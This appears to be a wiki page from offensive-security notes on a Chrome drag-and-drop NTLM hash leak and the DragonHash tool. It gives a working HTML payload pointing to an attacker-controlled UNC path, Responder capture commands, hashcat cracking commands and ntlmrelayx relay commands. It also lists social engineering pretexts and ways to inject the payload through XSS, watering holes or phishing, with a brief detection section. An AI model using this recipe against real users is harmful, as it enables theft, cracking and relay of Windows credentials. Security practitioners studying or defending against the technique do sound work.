---
title: Chrome NTLM Hash Leak (DragonHash)
permalink: /wiki/concepts/chrome-ntlm-hash-leak/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/offsec-notes/concepts/chrome-ntlm-hash-leak/
---

**Category:** Credential Access / Social Engineering
**MITRE ATT&CK:** T1187 — Forced Authentication; T1204.001 — User Execution: Malicious Link
**Related:** [Social Engineering](/wiki/concepts/social-engineering/), [Responder](/wiki/tools/responder/), [Active Directory Attacks](/wiki/concepts/active-directory-attacks/)

## Overview
Chrome's drag-and-drop implementation supports a `DownloadURL` data type that accepts a file URL. When the URL is a UNC path (`\\attacker\share\file`), Windows attempts NTLM authentication to resolve it — leaking the user's NTHash to an attacker-controlled SMB listener (Responder). The user must drag and drop an element; there is no interaction beyond that single gesture.

## Mechanism

When a user drags a browser element with `DownloadURL` data type containing a `file://` UNC path and releases it, Chromium's download handler calls Windows `PathFileExistsW` or similar file access API on the UNC path. Windows resolves the UNC path using NTLM authentication, sending the NTHash to the SMB server at the attacker's address.

**Key detail:** The NTLM auth is triggered on the **second** drag attempt on the same element — the first drag request attempts a HEAD request; the second initiates the download which triggers the UNC resolution.

## Tool: DragonHash

- Repository: github.com/hoodoer/DragonHash
- Demo: dragonhash.fun
- Generates a web page with a draggable element containing a `DownloadURL` data type pointing to `file://\\<attacker_ip>\share\file`

### Attack Flow
1. Stand up Responder: `responder -I eth0 -wrf`
2. Host the DragonHash page on attacker infrastructure or compromise a web server
3. Social engineer victim into visiting the page and dragging the provided element
4. On second drag release, Windows triggers NTLM auth → NTHash captured in Responder
5. Crack offline: `hashcat -m 5600 hash.txt wordlist.txt` (NTLMv2) or `-m 5500` (NTLMv1)

### Minimal HTML Payload
```html
<div draggable="true" 
     id="dragme"
     ondragstart="event.dataTransfer.setData(
       'DownloadURL', 
       'application/octet-stream:file.txt:file://\\\\<attacker_ip>\\share\\file.txt'
     )">
  Drag me to download your file
</div>
```

## Social Engineering Notes
- Effective pretexts: "Drag this icon to your desktop to save the document"
- Works on any site an operator can inject content into (XSS, watering hole, phishing)
- No admin rights required on victim system
- User sees no UAC prompt, no obvious sign of NTLM auth happening

## Limitations
- Requires user interaction (drag gesture)
- Does NOT work on Linux/macOS — NTLM auth is a Windows behavior
- If Credential Guard is enabled and properly configured, NTHash may not be usable directly
- Some corporate proxies block outbound SMB (port 445) — hash capture fails but RPC/HTTP NTLM relay may still work

## Responder Capture + Relay
```bash
# Capture only
responder -I eth0 -wrf

# Relay NTLMv2 to target (if capture hash is not crackable)
ntlmrelayx.py -t smb://<target_ip> -smb2support
# Then point DragonHash UNC to responder/relay listener IP
```

## Detection
- Outbound SMB (TCP 445) or NTLM auth to external/unusual IP from workstation
- Large-scale: monitor for SMB connections from user workstations to non-corporate IPs
- No endpoint-level IOC is particularly reliable — the NTLM auth is a legitimate Windows behavior

## References
- TrustedSec — "Dragging Secrets Out of Chrome: NTLM Hash Leaks" (2025-06-13)
- DragonHash — github.com/hoodoer/DragonHash
- Demo site — dragonhash.fun
